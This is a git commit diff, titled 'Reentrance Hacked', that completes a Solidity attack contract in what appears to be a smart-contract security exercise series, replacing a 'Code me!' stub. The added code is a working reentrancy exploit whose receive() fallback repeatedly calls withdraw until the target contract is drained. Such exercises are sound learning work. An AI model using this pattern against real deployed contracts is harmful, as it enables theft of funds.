cdbeb5474f21a236779218603cc3a83a2dc9a093
Adham <asorour@sfu.ca>
2023-05-21 22:34:34 -0700

    Reentrance Hacked

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -1,15 +1,24 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./Reentrance.sol";
+import "hardhat/console.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
-
+    Reentrance reentrance;
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        reentrance = Reentrance(contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        reentrance.donate{ value: address(this).balance }(address(this));
+        reentrance.withdraw();
+    }
+
+    receive() external payable {
+        if (contractAddress.balance > 0) {
+            reentrance.withdraw();
+        }
     }
 }
